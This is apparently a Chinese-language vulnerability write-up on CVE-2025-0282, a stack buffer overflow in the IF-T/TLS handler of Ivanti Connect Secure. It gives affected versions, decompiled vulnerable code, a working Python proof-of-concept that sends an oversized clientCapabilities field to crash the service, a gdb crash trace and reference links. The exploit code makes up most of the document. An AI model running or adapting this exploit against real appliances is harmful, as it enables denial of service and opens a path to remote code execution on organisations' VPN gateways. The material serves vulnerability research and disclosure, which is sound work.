# 影响版本

- Ivanti Connect Secure before version 22.7R2.5
- Ivanti Policy Secure before version 22.7R1.2
- Ivanti Neurons for ZTA gateways before version 22.7R2.3

# 成因

```c
    char dest[256];

    clientCapabilities = getKey(req, "clientCapabilities");
    if ( clientCapabilities != NULL )
    {
      clientCapabilitiesLength = strlen(clientCapabilities);
      if ( clientCapabilitiesLength != 0 )
	      connInfo->clientCapabilities = clientCapabilities;
      }
    }
    memset(dest, 0, sizeof(dest));
    strncpy(dest, connInfo->clientCapabilities, clientCapabilitiesLength);
```

对于具体的漏洞函数为web elf文件中的DSWSTncTransportHandler::DispatchMessage ( 或：tnctransport.cc::DispatchMessage )

```c
int __cdecl sub_5668EAD0(int a1, IftTlsHeader *a2, char *a3)
{
char dest[256]; // [esp+120h] [ebp-8ECh] BYREF
.............................................
  	needle = (char *)IftTlsHeader::getVendorId(a2);
    Type = (char *)IftTlsHeader::getType(a2);
    Len = (__guard *)IftTlsHeader::getLen(a2);
    IftTlsHeader::getId(a2);
    if ( !byte_56718218 && __cxa_guard_acquire((__guard *)&byte_56718218) )
    {
      dword_56718064 = DSGetStatementCounter(
                         "tnctransport.cc",
                         596,
                         "dispatchMessage",
                         "ifttls",
                         50,
                         "DispatchMessage(%x, %d, %d, %d)");
  .............................................
    v19 = (const char *)getValue((int)v52, IFT_JNPR_KEY_PREAUTH_INIT_CLIENT_CAPABILITIES);
    v20 = v19;
    if ( v19 )
    {
      v21 = strlen(v19);
      if ( v21 >= 0 )
      {
        if ( v21 >= *(_DWORD *)(a1 + 148) )
          DSStr::reserve((DSStr *)(a1 + 140), v21 + 1);
        memmove(*(void **)(a1 + 140), v20, v21);
        *(_DWORD *)(a1 + 144) = v21;
        *(_BYTE *)(*(_DWORD *)(a1 + 140) + v21) = 0;
      }
    }
    else if ( *(int *)(a1 + 148) > 0 )
    {
      v22 = 1;
      **(_BYTE **)(a1 + 140) = 0;
      *(_DWORD *)(a1 + 144) = 0;
      goto LABEL_55;
    }
    v22 = *(_DWORD *)(a1 + 144) + 1;
LABEL_55:
    memset(dest, 0, sizeof(dest));
    strncpy(dest, *(const char **)(a1 + 140), v22); //漏洞点位
```

# PoC

```py
import ssl
import socket
import struct
import time

HOST = "192.168.31.182"
PORT = 443  
DSNUMWEBS = 8

CIPHERS = "AES256-GCM-SHA384"
context = ssl.create_default_context()
context.minimum_version = ssl.TLSVersion.TLSv1_2
context.set_ciphers(CIPHERS)
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

def create_ssl_socket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))
    ssl_sock = context.wrap_socket(sock)
    return ssl_sock


def try_read_response(sock) -> bytes:
    def read_or_raise(n):
        read = sock.read(n)
        if not read:
            raise RuntimeError(f"Unable to read response headers: {headers}")
        return read

    count = 0
    max_count = 10
    while not (headers := sock.read(1)):
        count += 1
        time.sleep(0.1)
        if count == max_count:
            raise RuntimeError(f"Unable to read response headers: {headers}")

    while b"\r\n\r\n" not in headers:
        headers += read_or_raise(100)

    return headers

def try_upgrade_to_ifttls(sk):
    request = (f"GET / HTTP/1.1\r\n"
               f"Host: {HOST}\r\n"
               f"Connection: Upgrade\r\n"
               f"Upgrade: IF-T/TLS 1.0\r\n"
               f"\r\n")
    sk.sendall(request.encode())
    response = try_read_response(sk)
    return response

socks = []
for i in range(DSNUMWEBS):
    sk = create_ssl_socket()
    socks.append(sk)

for sk in socks:
    res = try_upgrade_to_ifttls(sk)
    if b"HTTP/1.1 101 Switching Protocols" not in res:
        print("Failed to upgrade to IF-T/TLS")
        sk.close()
        continue
    
    ift_data = bytearray()
    ift_data.extend(struct.pack('!I', 0x00000A4C)) # getVendorId
    ift_data.extend(struct.pack('!I', 0x00000088)) # type

    payload = "clientCapabilities=" + "a"*1024

    ift_data.extend(struct.pack('!I', 16 + len(payload))) # len
    ift_data.extend(struct.pack('!I', 0x00000000)) # seq id

    sk.sendall(ift_data)
    sk.sendall(payload.encode())

while True:
    time.sleep(4)
```

```
0xf7f52db9 in __kernel_vsyscall ()
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0xf4f68d1d in free () from /lib/libc.so.6
(gdb) bt
#0  0xf4f68d1d in free () from /lib/libc.so.6
#1  0xf6d5a35f in DSUtilMemPool::~DSUtilMemPool() ()
   from /home/ecbuilds/int-rel/sa/22.7/bld3431.1/install/lib/libdsplibs.so
#2  0x5668f4e8 in ?? ()
#3  0x5668fe7b in ?? ()
#4  0xf5fc5565 in IftTlsParser::parse(unsigned char const*, unsigned int) ()
   from /home/ecbuilds/int-rel/sa/22.7/bld3431.1/install/lib/libdsagentd.so
```

# 一些有用的帮助

```
HTTP/1.1 101 Switching Protocols
Content-type: application/octet-stream
Pragma: no-cache
Upgrade: IF-T/TLS 1.0
Connection: Upgrade
HC_HMAC_VERSION_COOKIE: 1
supportSHA2Signature: 1
X-XSS-Protection: 1
Strict-Transport-Security: max-age=31536000
accept-ch:Sec-CH-UA-Platform-Version
```

# 参考资料

Do Secure-By-Design Pledges Come With Stickers? - Ivanti Connect Secure RCE (CVE-2025-0282)

https://labs.watchtowr.com/do-secure-by-design-pledges-come-with-stickers-ivanti-connect-secure-rce-cve-2025-0282/

Exploitation Walkthrough and Techniques

https://labs.watchtowr.com/exploitation-walkthrough-and-techniques-ivanti-connect-secure-rce-cve-2025-0282/

CVE-2025-0282

https://github.com/sfewer-r7/CVE-2025-0282/blob/main/CVE-2025-0282.rb